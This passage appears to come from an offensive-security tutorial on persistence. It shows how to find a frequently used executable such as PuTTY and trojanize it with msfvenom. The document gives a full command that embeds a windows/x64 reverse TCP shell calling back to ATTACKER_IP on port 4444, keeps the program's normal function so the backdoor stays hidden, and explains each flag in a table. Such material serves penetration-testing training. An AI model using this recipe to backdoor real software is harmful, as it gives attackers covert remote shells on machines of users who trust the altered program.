If you find any executable laying around the desktop, the chances are high that the user might use it frequently. Suppose we find a shortcut to PuTTY lying around. If we checked the shortcut's properties, we could see that it (usually) points to `C:\Program Files\PuTTY\putty.exe`. From that point, we could download the executable to our attacker's machine and modify it to run any payload we wanted.

You can easily plant a payload of your preference in any .exe file with `msfvenom`. The binary will still work as usual but execute an additional payload silently by adding an extra thread in your binary. To create a backdoored putty.exe, we can use the following command:
```shell-session
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

| **Command**                     | **Details**                                                                                                                                                                   |
|---------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `-a x64`                        | Specifies the target architecture as **64-bit** for Windows systems.                                                                                                             |
| `--platform windows`            | Sets the target platform as **Windows**, indicating the payload is intended for Windows OS.                                                                                      |
| `-x putty.exe`                  | Specifies the legitimate executable (`putty.exe`) into which the payload will be injected. `putty.exe` is commonly used as a SSH and telnet client for Windows.                  |
| `-k`                            | Ensures that the original functionality of `putty.exe` is **preserved** after payload injection, so it runs normally while also executing the payload.                          |
| `-p windows/x64/shell_reverse_tcp` | Defines the payload as `windows/x64/shell_reverse_tcp`, which opens a **reverse shell** on the victim's machine, allowing remote command execution by the attacker.     |
| `lhost=ATTACKER_IP`             | Specifies the **attacker’s IP address** where the reverse shell will connect. Replace `ATTACKER_IP` with the IP address of the attacking machine (e.g., `192.168.1.100`).     |
| `lport=4444`                    | Defines the **port number** (e.g., `4444`) on the attacker’s machine to listen for incoming connections from the reverse shell.                                                 |
| `-b "\x00"`                     | Specifies **bad characters** (`"\x00"` in this case) to exclude from the payload. Null byte (`\x00`) is often excluded to avoid premature string termination issues.            |
| `-f exe`                        | Sets the format of the output file as a **Windows executable** (`exe`).                                                                                                         |
| `-o puttyX.exe`                 | Specifies the **output file name** as `puttyX.exe`, which will contain the modified executable with the embedded payload.                                                       |
